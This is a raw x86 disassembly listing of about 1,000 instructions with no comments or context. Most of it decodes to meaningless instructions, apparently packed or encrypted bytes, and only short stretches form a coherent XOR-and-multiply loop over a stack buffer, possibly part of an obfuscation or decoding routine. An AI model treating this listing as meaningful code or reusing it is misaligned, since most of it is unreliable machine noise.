  41ec9c:	ror    DWORD PTR ds:0x51a40367,1
  41eca2:	sub    eax,0x383c4f68
  41eca7:	push   0x11
  41eca9:	fist   WORD PTR [ebp-0x7]
  41ecac:	stos   BYTE PTR es:[edi],al
  41ecad:	xchg   ebx,eax
  41ecae:	es fs jecxz 0x41eca9
  41ecb2:	push   ds
  41ecb3:	xlat   BYTE PTR ds:[ebx]
  41ecb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecb5:	add    bh,BYTE PTR [ebx+ebp*1+0x4fcbe1a0]
  41ecbc:	or     bh,0xd9
  41ecbf:	adc    eax,0x4740e372
  41ecc4:	pop    ecx
  41ecc5:	daa    
  41ecc6:	adc    eax,0x169f341c
  41eccb:	pop    eax
  41eccc:	cmp    BYTE PTR [esp+ebx*2+0x6eb50f45],cl
  41ecd3:	fnstenv [eax+ebp*2]
  41ecd6:	sti    
  41ecd7:	test   ah,0x3
  41ecda:	add    eax,0xadd47a7e
  41ecdf:	ficomp WORD PTR [eax+0x5b]
  41ece2:	(bad)  
  41ece3:	ins    DWORD PTR es:[edi],dx
  41ece4:	int3   
  41ece5:	les    ebp,FWORD PTR ds:0x6208cd2c
  41eceb:	xchg   ecx,eax
  41ecec:	js     0x41ed10
  41ecee:	push   es
  41ecef:	push   es
  41ecf0:	ret    0x7682
  41ecf3:	mov    esi,0x2753109a
  41ecf8:	(bad)  
  41ecf9:	jecxz  0x41ed6f
  41ecfb:	mov    eax,ds:0x50b04285
  41ed00:	push   ebx
  41ed01:	jle    0x41ed06
  41ed03:	mov    dh,0x6
  41ed05:	jg     0x41ed6f
  41ed07:	pop    esp
  41ed08:	fxch   st(4)
  41ed0a:	outs   dx,BYTE PTR ds:[esi]
  41ed0b:	inc    esi
  41ed0c:	mov    al,0x35
  41ed0e:	mov    esi,0x4879f89f
  41ed13:	xor    BYTE PTR [esi+0x7a],ah
  41ed16:	xor    esi,0xfffffff3
  41ed19:	push   cs
  41ed1a:	mov    cl,0xa8
  41ed1c:	iret   
  41ed1d:	jae    0x41ed37
  41ed1f:	jno    0x41ed1e
  41ed21:	stc    
  41ed22:	push   esp
  41ed23:	cmp    BYTE PTR [edi],bh
  41ed25:	mov    esi,0x8a362153
  41ed2a:	scas   al,BYTE PTR es:[edi]
  41ed2b:	out    dx,eax
  41ed2c:	int    0x39
  41ed2e:	popa   
  41ed2f:	pop    DWORD PTR [eax-0x3f053923]
  41ed35:	mov    bh,0x32
  41ed37:	jmp    0x934e:0x8cb67be5
  41ed3e:	fwait
  41ed3f:	mov    esp,0xf4a5aeb3
  41ed44:	stos   DWORD PTR es:[edi],eax
  41ed45:	das    
  41ed46:	imul   ebp,DWORD PTR ds:0xd3a03a44,0xffffffcc
  41ed4d:	cmp    BYTE PTR [esi-0x1abf78fc],0xa0
  41ed54:	out    0xeb,eax
  41ed56:	lock push ebp
  41ed58:	in     eax,dx
  41ed59:	aam    0x80
  41ed5b:	popf   
  41ed5c:	xchg   al,dh
  41ed5e:	rol    DWORD PTR [ebx+0x6e],0x54
  41ed62:	mov    edx,0xa40c783f
  41ed67:	inc    ebp
  41ed68:	or     al,0x33
  41ed6a:	retf   
  41ed6b:	push   eax
  41ed6c:	inc    DWORD PTR [esi]
  41ed6e:	adc    dl,BYTE PTR [ecx-0x7f8fad80]
  41ed74:	mov    BYTE PTR [eax-0x4a],dl
  41ed77:	xchg   ebx,edx
  41ed79:	stos   DWORD PTR es:[edi],eax
  41ed7a:	stc    
  41ed7b:	in     eax,0xea
  41ed7d:	add    BYTE PTR [edi],bh
  41ed7f:	inc    esp
  41ed80:	and    eax,0xed567a44
  41ed85:	test   DWORD PTR [edx+0x4a],edi
  41ed88:	jmp    0x41ee02
  41ed8a:	ja     0x41ed6e
  41ed8c:	dec    esp
  41ed8d:	cwde   
  41ed8e:	je     0x41ed83
  41ed90:	(bad)  
  41ed91:	jns    0x41eda5
  41ed93:	mov    edx,0x6c7d25ee
  41ed98:	cld    
  41ed99:	add    DWORD PTR [ebx-0x5c754849],esp
  41ed9f:	sti    
  41eda0:	adc    DWORD PTR [eax+0x3c61ece0],esp
  41eda6:	jg     0x41edc9
  41eda8:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edaa:	nop
  41edab:	jbe    0x41ee18
  41edad:	xchg   esi,eax
  41edae:	and    ecx,eax
  41edb0:	ja     0x41edfd
  41edb2:	jno    0x41ed3c
  41edb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edb5:	pop    eax
  41edb6:	sar    DWORD PTR [ebp-0x1f],0x54
  41edba:	jp     0x41ed98
  41edbc:	pop    edx
  41edbd:	int3   
  41edbe:	cmp    ah,BYTE PTR [esi]
  41edc0:	mov    ds,WORD PTR [ebp+0x6b]
  41edc3:	adc    al,0x0
  41edc5:	aad    0xda
  41edc7:	lea    eax,[esi]
  41edc9:	or     BYTE PTR [ecx+0x7777f55c],0xba
  41edd0:	mov    bh,0xdf
  41edd2:	add    bl,BYTE PTR [ebx+0x4b2ab6ab]
  41edd8:	outs   dx,DWORD PTR ds:[esi]
  41edd9:	stos   BYTE PTR es:[edi],al
  41edda:	jle    0x41ee29
  41eddc:	hlt    
  41eddd:	pushf  
  41edde:	stos   BYTE PTR es:[edi],al
  41eddf:	mov    al,0x67
  41ede1:	adc    eax,0xff22c038
  41ede6:	sub    al,0x5c
  41ede8:	pop    eax
  41ede9:	and    al,0x80
  41edeb:	jb     0x41ed94
  41eded:	clc    
  41edee:	dec    esp
  41edef:	ins    DWORD PTR es:[edi],dx
  41edf0:	repnz mov ebx,0xdf95508d
  41edf6:	in     eax,0x8b
  41edf8:	jae    0x41ee72
  41edfa:	mov    WORD PTR [ebp-0x1b9f4034],es
  41ee00:	movq   mm2,QWORD PTR [eax+ebx*1-0x473dbb89]
  41ee08:	repnz loopne 0x41ee06
  41ee0b:	xchg   ebp,eax
  41ee0c:	outs   dx,BYTE PTR ds:[esi]
  41ee0d:	aam    0x36
  41ee0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee10:	aad    0xfb
  41ee12:	sub    BYTE PTR [ecx],dl
  41ee14:	cmp    eax,0x77063f0b
  41ee19:	push   esp
  41ee1a:	inc    ebp
  41ee1b:	mov    WORD PTR [ebx+0x1d919ba],ss
  41ee21:	xchg   esi,eax
  41ee22:	test   DWORD PTR [ecx],ebp
  41ee24:	pushf  
  41ee25:	dec    edx
  41ee26:	sub    al,0x92
  41ee28:	enter  0xa6cf,0x79
  41ee2c:	adc    DWORD PTR [eax+0x33],0xad65fc6e
  41ee33:	xchg   edx,eax
  41ee34:	adc    al,0xf9
  41ee36:	ins    BYTE PTR es:[edi],dx
  41ee37:	xor    ebp,DWORD PTR ds:[esi+ecx*4]
  41ee3b:	push   eax
  41ee3c:	pop    edx
  41ee3d:	adc    BYTE PTR [ecx-0x71e33f00],bh
  41ee43:	ret    0xab93
  41ee46:	ret    
  41ee47:	(bad)  
  41ee49:	(bad)  
  41ee4a:	dec    eax
  41ee4b:	cs jmp 0xfa39:0x7b81302e
  41ee53:	jp     0x41edd8
  41ee55:	repnz xchg esp,eax
  41ee57:	push   es
  41ee58:	leave  
  41ee59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee5a:	push   es
  41ee5b:	add    DWORD PTR [edx],0x2a
  41ee5e:	(bad)  
  41ee5f:	sbb    eax,0x9b989a67
  41ee64:	jbe    0x41ee6a
  41ee66:	jo     0x41ee6c
  41ee68:	or     BYTE PTR [ebp-0x167dbb02],bl
  41ee6e:	xchg   edi,eax
  41ee6f:	repz fnstenv [edi-0x2dc75f3f]
  41ee76:	cli    
  41ee77:	pop    edx
  41ee78:	adc    dl,BYTE PTR [edx]
  41ee7a:	mov    ds:0x65182b4b,eax
  41ee7f:	aad    0xe4
  41ee81:	pop    es
  41ee82:	push   ebx
  41ee83:	add    DWORD PTR [edi],0xfadb50dc
  41ee89:	cli    
  41ee8a:	push   cs
  41ee8b:	retf   0x61f4
  41ee8e:	stos   BYTE PTR es:[edi],al
  41ee8f:	and    eax,eax
  41ee91:	push   cs
  41ee92:	(bad)  
  41ee93:	ins    DWORD PTR es:[edi],dx
  41ee94:	sbb    al,0xde
  41ee96:	int    0xc0
  41ee98:	mov    esi,0xa1eed27b
  41ee9d:	inc    edi
  41ee9e:	stos   BYTE PTR es:[edi],al
  41ee9f:	cmp    bl,ch
  41eea1:	mov    esp,0x164f3916
  41eea6:	lods   al,BYTE PTR ds:[esi]
  41eea7:	xor    bh,BYTE PTR [eax-0x455a42ab]
  41eead:	cmp    eax,0xbca6da4
  41eeb2:	push   es
  41eeb3:	and    ebx,DWORD PTR [edi-0x50]
  41eeb6:	or     esp,edx
  41eeb8:	jmp    0x41eee6
  41eeba:	les    esi,FWORD PTR [ebx+0x25]
  41eebd:	test   BYTE PTR [ecx],ah
  41eebf:	jp     0x41ee44
  41eec1:	ja     0x41ef36
  41eec3:	dec    ebp
  41eec4:	cld    
  41eec5:	inc    eax
  41eec6:	jbe    0x41eebc
  41eec8:	aad    0xc9
  41eeca:	mov    dl,0xd8
  41eecc:	jmp    0x5579:0xd3985198
  41eed3:	sub    BYTE PTR [edi+0x3007c94],bl
  41eed9:	push   0xbc8c97c7
  41eede:	or     DWORD PTR [ecx+esi*1-0xebcb70d],0x3e36780d
  41eee9:	in     eax,0x68
  41eeeb:	push   ss
  41eeec:	iret   
  41eeed:	mov    DWORD PTR [edx+0x694f4bd9],edi
  41eef3:	sbb    BYTE PTR [ebx+eax*1-0x6c],dh
  41eef7:	pop    edx
  41eef8:	inc    esi
  41eef9:	rcl    DWORD PTR [eax+0x52],0x35
  41eefd:	mov    ecx,0xfb51bfac
  41ef02:	xchg   bh,ch
  41ef04:	cmp    BYTE PTR [ecx+0x235c274d],ch
  41ef0a:	pusha  
  41ef0b:	mov    eax,ds:0x43eee2b7
  41ef10:	mov    ch,0x5b
  41ef12:	iret   
  41ef13:	xchg   BYTE PTR [edx+esi*2-0x34],al
  41ef17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef18:	ins    DWORD PTR es:[edi],dx
  41ef19:	push   es
  41ef1a:	sar    DWORD PTR [esi],cl
  41ef1c:	rcl    DWORD PTR [eax],0xbd
  41ef1f:	test   ch,ah
  41ef21:	cli    
  41ef22:	imul   esp,DWORD PTR [ecx],0xffffffd1
  41ef25:	sub    dl,ah
  41ef27:	push   ecx
  41ef28:	gs dec edx
  41ef2a:	pop    ss
  41ef2b:	pop    edx
  41ef2c:	mov    dl,0x8
  41ef2e:	xchg   esi,eax
  41ef2f:	data16 mov ?,WORD PTR [esi+0x2107be4b]
  41ef36:	mov    edi,0xa9f68e78
  41ef3b:	outs   dx,BYTE PTR ds:[esi]
  41ef3c:	outs   dx,BYTE PTR ds:[esi]
  41ef3d:	and    eax,0x4c8071f
  41ef42:	adc    ebx,edi
  41ef44:	mov    edi,0xbbe63f2d
  41ef49:	jmp    0x41ef1f
  41ef4b:	dec    edx
  41ef4c:	rcr    DWORD PTR [ebx],cl
  41ef4e:	xor    DWORD PTR [ebp+edi*1-0x7a],eax
  41ef52:	gs int 0xff
  41ef55:	push   edi
  41ef56:	nop
  41ef57:	xor    BYTE PTR [eax],al
  41ef59:	loop   0x41eef5
  41ef5b:	or     eax,0xcbda407f
  41ef60:	mov    al,ds:0x77a1157e
  41ef65:	cld    
  41ef66:	push   edi
  41ef67:	jecxz  0x41ef98
  41ef69:	xor    ah,dl
  41ef6b:	ret    0x7605
  41ef6e:	sub    BYTE PTR [esi],dh
  41ef70:	xchg   esp,eax
  41ef71:	(bad)  
  41ef72:	sub    ebp,eax
  41ef74:	push   ss
  41ef75:	test   al,dh
  41ef77:	add    eax,0x105bf914
  41ef7c:	je     0x41ef3a
  41ef7e:	dec    esp
  41ef7f:	mov    cl,0xd0
  41ef81:	pop    eax
  41ef82:	xor    al,ch
  41ef84:	sbb    esp,DWORD PTR [ebp+0x6001e19f]
  41ef8a:	add    DWORD PTR [esi-0x64],esp
  41ef8d:	xor    DWORD PTR [edi],0x93eb9ccf
  41ef93:	adc    eax,0xc177ae5b
  41ef98:	xlat   BYTE PTR ds:[ebx]
  41ef99:	jg     0x41ef65
  41ef9b:	mov    ch,0xda
  41ef9e:	int3   
  41ef9f:	sub    BYTE PTR ds:[edx+0x182e0f1a],bl
  41efa6:	leave  
  41efa7:	and    al,0x62
  41efa9:	adc    bh,dl
  41efab:	pop    ss
  41efac:	mov    esp,0xfc46ceb2
  41efb1:	adc    eax,0x9ad20674
  41efb6:	or     eax,0xc014bc13
  41efbb:	and    BYTE PTR [esi-0x46500456],ch
  41efc1:	push   edi
  41efc2:	dec    ebx
  41efc3:	(bad)  
  41efc4:	mov    ch,0xa7
  41efc6:	and    eax,0xdc57d33b
  41efcb:	dec    edi
  41efcc:	(bad)  
  41efcd:	inc    esi
  41efce:	mov    edi,0xc97a2ead
  41efd3:	push   ebp
  41efd4:	sub    edi,DWORD PTR [edi*4-0x717d751d]
  41efdb:	out    0xcc,eax
  41efdd:	iret   
  41efde:	jb     0x41efdb
  41efe0:	jp     0x41ef72
  41efe2:	(bad)  
  41efe3:	ins    DWORD PTR es:[edi],dx
  41efe4:	sub    ecx,eax
  41efe6:	daa    
  41efe7:	push   edx
  41efe8:	call   0x611b:0x4889546a
  41efef:	clc    
  41eff0:	pop    es
  41eff1:	sahf   
  41eff2:	mov    bl,0xb5
  41eff4:	aam    0xa0
  41eff6:	push   cs
  41eff7:	mov    ah,0x92
  41eff9:	xchg   esi,eax
  41effa:	in     al,dx
  41effb:	push   0xc8336e76
  41f000:	add    ecx,esi
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x6a046403
  41f0bf:	adc    ch,BYTE PTR [ecx+edx*2-0x28]
  41f0c3:	popa   
  41f0c4:	bound  edi,QWORD PTR [edi+ebx*2]
  41f0c7:	bound  esp,QWORD PTR [edx-0x13]
  41f0ca:	repnz xor ebp,DWORD PTR [esi-0x59b39811]
  41f0d1:	mov    esp,0x43180dac
  41f0d6:	jo     0x41f0a3
  41f0d8:	mov    cl,0x45
  41f0da:	and    al,bh
  41f0dc:	sar    DWORD PTR [edi-0x3265de6b],cl
  41f0e2:	xlat   BYTE PTR ds:[ebx]
  41f0e3:	shl    BYTE PTR [eax],cl
  41f0e5:	cmp    dl,BYTE PTR [edx]
  41f0e7:	gs push ss
  41f0e9:	mov    ecx,edi
  41f0eb:	push   0xfe6be442
  41f0f0:	pmuludq mm0,QWORD PTR [esp+eiz*8]
  41f0f4:	lahf   
  41f0f5:	sahf   
  41f0f6:	add    eax,0x37e61045
  41f0fb:	mov    DWORD PTR ds:0xea0c5273,eax
  41f101:	retf   0x4dbc
  41f104:	out    dx,al
  41f105:	lods   eax,DWORD PTR ds:[esi]
  41f106:	nop
  41f107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f109:	(bad)  
  41f10b:	pushf  
  41f10c:	mov    ebx,0x1d6668b4
  41f111:	loop   0x41f0cc
  41f113:	enter  0xc27b,0x2b
  41f117:	lock jne 0x41f0c1
  41f11a:	push   ecx
  41f11b:	mov    cl,0x8b
  41f11d:	imul   edx,edx,0xd824bf27
  41f123:	ret    
  41f124:	jae    0x41f0c3
  41f126:	aaa    
  41f127:	loopne 0x41f0ea
  41f129:	push   esi
  41f12a:	cmp    DWORD PTR [esi+0x259ad811],esp
  41f130:	xchg   esi,eax
  41f131:	xor    eax,0xf6874539
  41f136:	push   esi
  41f137:	inc    ebx
  41f138:	dec    ecx
  41f139:	push   DWORD PTR [ebx+esi*4+0x4ad34692]
  41f140:	shl    BYTE PTR [eax],cl
  41f142:	mov    eax,0xf5c344a1
  41f147:	jp     0x41f13c
  41f149:	inc    esi
  41f14a:	outs   dx,BYTE PTR ds:[esi]
  41f14b:	(bad)
  41f14f:	xchg   edx,eax
  41f150:	rol    dl,cl
  41f152:	int    0xf8
  41f154:	adc    ch,ch
  41f156:	pusha  
  41f157:	inc    esp
  41f158:	clc    
  41f159:	cli    
  41f15a:	sub    al,0xd3
  41f15c:	mov    eax,ds:0x80c2e9e2
  41f161:	cmp    al,0xb8
  41f163:	mov    esp,0xe5aaa0f4
  41f168:	inc    esi
  41f169:	rol    BYTE PTR ds:[esi],cl
  41f16c:	lods   al,BYTE PTR ds:[esi]
  41f16d:	fldcw  WORD PTR ss:[eax-0x2]
  41f171:	mov    gs,WORD PTR [ebp-0x6c]
  41f174:	sub    edi,esi
  41f176:	sbb    dl,ah
  41f178:	mov    eax,ds:0x1700a7fe
  41f17d:	or     DWORD PTR [edi-0x708f351d],0x49
  41f184:	and    DWORD PTR [ebx+edi*1],ebx
  41f187:	mov    cl,0x13
  41f189:	outs   dx,BYTE PTR ds:[esi]
  41f18a:	fldcw  WORD PTR [edx+0x11b51d6d]
  41f190:	sub    bl,BYTE PTR [edi+ebp*8]
  41f193:	mov    ch,0xa0
  41f195:	cmp    eax,0x65cb65c3
  41f19a:	in     eax,0x6e
  41f19c:	mov    ebp,0x8f8dd72e
  41f1a1:	retf   
  41f1a2:	add    eax,0x239c4e91
  41f1a7:	jae    0x41f1c1
  41f1a9:	jl     0x41f1bf
  41f1ab:	in     al,0x90
  41f1ad:	jge    0x41f170
  41f1af:	pop    ebx
  41f1b0:	mov    edx,0x8b7802f4
  41f1b5:	adc    eax,0x2fd10ac9
  41f1ba:	mov    ds:0xaf9c4281,eax
  41f1bf:	shr    DWORD PTR [esi],1
  41f1c1:	adc    eax,0x1b8c538b
  41f1c6:	or     BYTE PTR [edx-0x1f93877f],al
  41f1cc:	mov    ds:0xf837ec4f,eax
  41f1d1:	iret   
  41f1d2:	mov    ?,WORD PTR [esi]
  41f1d4:	dec    eax
  41f1d5:	fs cs mov esi,0x399cf9e4
  41f1dc:	test   eax,0xb38dd303
  41f1e1:	inc    esp
  41f1e2:	in     al,0x8c
  41f1e4:	aas    
  41f1e5:	inc    esp
  41f1e6:	sahf   
  41f1e7:	ficomp WORD PTR [eax-0x6bd5459c]
  41f1ed:	mov    ch,cl
  41f1ef:	mov    ss,WORD PTR [ecx-0x6a1d9825]
  41f1f5:	in     al,0x62
  41f1f7:	pop    ds
  41f1f8:	leave  
  41f1f9:	cmp    eax,0x6f15cb2a
  41f1fe:	push   ecx
  41f1ff:	jb     0x41f275
  41f201:	pop    edx
  41f202:	jae    0x41f24e
  41f204:	je     0x41f270
  41f206:	cmp    BYTE PTR [edx+0x3f],0x41
  41f20a:	outs   dx,DWORD PTR ds:[esi]
  41f20b:	fs xchg esi,eax
  41f20d:	ss cmc 
  41f20f:	imul   ebx,DWORD PTR [edx+0xf],0x2cdbe06d
  41f216:	not    BYTE PTR [ebp+0x6f]
  41f219:	jns    0x41f1a4
  41f21b:	test   eax,0x116f1546
  41f220:	outs   dx,BYTE PTR ds:[esi]
  41f221:	mov    dh,0xd5
  41f223:	adc    al,0x4d
  41f225:	jae    0x41f228
  41f227:	aas    
  41f228:	div    DWORD PTR [eax]
  41f22a:	je     0x41f26f
  41f22c:	add    BYTE PTR [ecx+0x289ba052],ch
  41f232:	mov    eax,0x4aef57aa
  41f237:	(bad)  
  41f238:	xor    ch,BYTE PTR [edx]
  41f23a:	mov    al,0x7d
  41f23c:	std    
  41f23d:	cdq    
  41f23e:	and    esp,DWORD PTR gs:[eax+0x116d81b8]
  41f245:	lods   eax,DWORD PTR ds:[esi]
  41f246:	mov    dh,0x1d
  41f248:	imul   edi,DWORD PTR [esi+0x48],0x6
  41f24c:	sar    BYTE PTR [ebx+0x4a],0x5a
  41f250:	(bad)  
  41f251:	cs pop ss
  41f253:	mov    ah,0xf7
  41f255:	dec    eax
  41f256:	dec    edx
  41f257:	xor    esi,DWORD PTR ds:0xa96e7863
  41f25d:	lds    ecx,FWORD PTR [esi+eax*4+0x424f6f1f]
  41f264:	es loopne 0x41f210
  41f267:	cmp    bh,bh
  41f269:	(bad)  
  41f26a:	pop    ebx
  41f26b:	loope  0x41f1f8
  41f26d:	(bad)  
  41f26e:	cmp    eax,0xbeba0f5
  41f273:	dec    eax
  41f274:	lds    eax,FWORD PTR [ecx]
  41f276:	ret    
  41f277:	sbb    al,0x51
  41f279:	lods   al,BYTE PTR ds:[esi]
  41f27a:	out    dx,al
  41f27b:	push   0x41
  41f27d:	push   es
  41f27e:	enter  0x57b8,0x92
  41f282:	icebp  
  41f283:	(bad)  
  41f284:	(bad)  
  41f286:	add    DWORD PTR ds:0x810a7769,ebx
  41f28c:	aas    
  41f28d:	outs   dx,DWORD PTR ds:[esi]
  41f28e:	jo     0x41f301
  41f290:	cmp    DWORD PTR [ecx+0x5591bbe3],esi
  41f296:	add    al,0x44
  41f298:	inc    ebx
  41f299:	jae    0x41f248
  41f29b:	pop    ss
  41f29c:	out    0xbd,eax
  41f29e:	and    bh,ah
  41f2a0:	push   0x72b4bf58
  41f2a5:	hlt    
  41f2a6:	aaa    
  41f2a7:	stos   DWORD PTR es:[edi],eax
  41f2a8:	call   0x4cdc0d4b
  41f2ad:	push   ds
  41f2ae:	xlat   BYTE PTR ds:[ebx]
  41f2af:	fmul   QWORD PTR [esi-0x6ae55aaf]
  41f2b5:	sub    BYTE PTR [ebx+0x69],ch
  41f2b8:	rol    BYTE PTR [esi-0x7ae3c5bb],1
  41f2be:	mov    ecx,0xe3e50bd5
  41f2c3:	pop    edx
  41f2c4:	and    DWORD PTR [ebx+0x20],eax
  41f2c7:	lock xor DWORD PTR [eax+0x2d503780],esp
  41f2ce:	add    dl,BYTE PTR [ebx]
  41f2d0:	mov    cl,BYTE PTR [ecx+ebx*8+0x18be59f1]
  41f2d7:	into   
  41f2d8:	mov    ecx,0xfdf0515e
  41f2dd:	mul    BYTE PTR [edi-0x3c]
  41f2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2e1:	mov    al,ds:0x8535e644
  41f2e6:	popa   
  41f2e7:	out    dx,al
  41f2e8:	cmp    al,0xad
  41f2ea:	scas   eax,DWORD PTR es:[edi]
  41f2eb:	push   esp
  41f2ec:	in     eax,dx
  41f2ed:	cld    
  41f2ee:	pop    es
  41f2ef:	imul   ebp,DWORD PTR [eax+0x302c3ca4],0xffffffe5
  41f2f6:	(bad)  
  41f2f8:	or     eax,0x4cc64285
  41f2fd:	std    
  41f2fe:	ins    BYTE PTR es:[edi],dx
  41f2ff:	gs inc esi
  41f301:	jno    0x41f283
  41f303:	fldenv [ebx]
  41f305:	nop
  41f306:	xor    eax,0xbeab34ac
  41f30b:	pusha  
  41f30c:	clc    
  41f30d:	adc    al,0x52
  41f30f:	cmp    ecx,ebx
  41f311:	popa   
  41f312:	push   esp
  41f313:	inc    eax
  41f314:	mov    bh,0x13
  41f316:	jnp    0x41f366
  41f318:	pop    es
  41f319:	push   cs
  41f31a:	pop    edi
  41f31b:	mov    ch,0xa4
  41f31d:	dec    ecx
  41f31e:	ficom  WORD PTR [edx]
  41f320:	outs   dx,DWORD PTR ds:[esi]
  41f321:	retf   0x37ad
  41f324:	scas   al,BYTE PTR es:[edi]
  41f325:	loopne 0x41f380
  41f327:	mov    dl,BYTE PTR [ecx-0x6ff2f032]
  41f32d:	sbb    BYTE PTR [ebp+ecx*4+0x5c05e318],cl
  41f334:	sub    eax,0xcbe217e3
  41f339:	adc    bl,BYTE PTR [eax+0x2d]
  41f33c:	sbb    cl,BYTE PTR [edx]
  41f33e:	push   0xf8e34150
  41f343:	xlat   BYTE PTR ds:[ebx]
  41f344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f345:	rep outs dx,BYTE PTR ds:[esi]
  41f347:	pusha  
  41f348:	or     BYTE PTR [ebp+0x2d],0xda
  41f34c:	mov    dl,BYTE PTR [eax]
  41f34e:	dec    ebp
  41f34f:	adc    BYTE PTR [esi+0x665c1b04],dl
  41f355:	push   esp
  41f356:	jbe    0x41f326
  41f358:	xlat   BYTE PTR ds:[ebx]
  41f359:	int3   
  41f35a:	xor    al,0xef
  41f35c:	daa    
  41f35d:	lahf   
  41f35e:	maskmovq mm2,(bad)
  41f35f:	not    DWORD PTR [eax]
  41f361:	repnz shl DWORD PTR [ebp+edx*8+0x1c],0xb0
  41f367:	xor    al,dh
  41f369:	push   esp
  41f36a:	xchg   edi,eax
  41f36b:	inc    ebp
  41f36c:	or     edi,DWORD PTR [edx+0x1aeaabf2]
  41f372:	scas   al,BYTE PTR es:[edi]
  41f373:	and    al,0x94
  41f375:	push   cs
  41f376:	mov    esp,0xa3167efc
  41f37b:	inc    ebp
  41f37c:	sub    ah,0x98
  41f37f:	cmp    cl,bl
  41f381:	and    al,al
  41f383:	ja     0x41f37a
  41f385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f386:	dec    esp
  41f387:	in     eax,0x68
  41f389:	mov    ah,dh
  41f38b:	or     edi,DWORD PTR [esi-0x2d]
  41f38e:	fnsave [edi-0x17bd159d]
  41f394:	test   bl,dh
  41f396:	push   ss
  41f397:	add    al,cl
  41f399:	cmp    al,BYTE PTR [edi]
  41f39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f39c:	rcr    edi,cl
  41f39e:	pop    es
  41f39f:	cwde   
  41f3a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3a1:	cmp    DWORD PTR [esi+0x4b],esi
  41f3a4:	test   al,0xfb
  41f3a6:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3a8:	jmp    0x41f3d0
  41f3aa:	sbb    BYTE PTR [esi],bl
  41f3ac:	add    bl,ah
  41f3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3af:	icebp  
  41f3b0:	add    DWORD PTR [edi],edx
  41f3b2:	(bad)  [edi+0x7c4b3021]
  41f3b8:	pop    ebp
  41f3b9:	sbb    DWORD PTR [esi],0x5
  41f3bc:	addr16 daa 
  41f3be:	cmp    eax,0x448812a3
  41f3c3:	jp     0x41f3e5
  41f3c5:	sub    dl,BYTE PTR [ebx-0x5d]
  41f3c8:	or     eax,0x5733fe83
  41f3cd:	sub    ebp,DWORD PTR [eiz*2+0x1aaafddd]
  41f3d4:	jns    0x41f3da
  41f3d6:	ja     0x41f3a2
  41f3d8:	je     0x41f36a
  41f3da:	cs jecxz 0x41f3cb
  41f3dd:	sbb    DWORD PTR [ebp-0x9c4e833],edx
  41f3e3:	jg     0x41f3d1
  41f3e5:	in     eax,0xb5
  41f3e7:	aam    0xf1
  41f3e9:	shr    DWORD PTR [esi+0xfeffb8],cl
  41f3ef:	sub    ch,BYTE PTR [edi-0x3243c3c0]
  41f3f5:	adc    al,0x22
  41f3f7:	mov    ds,WORD PTR [eax+ebp*1-0x4c39c5d0]
  41f3fe:	ret    
  41f3ff:	int3   
  41f400:	hlt    
  41f401:	jmp    0x41f400
  41f403:	enter  0xef0e,0x0
  41f407:	mov    ds:0x738a6f02,al
  41f40c:	bound  edi,QWORD PTR [edx-0x30]
  41f40f:	repz sbb esi,eax
  41f412:	mov    al,0xfd
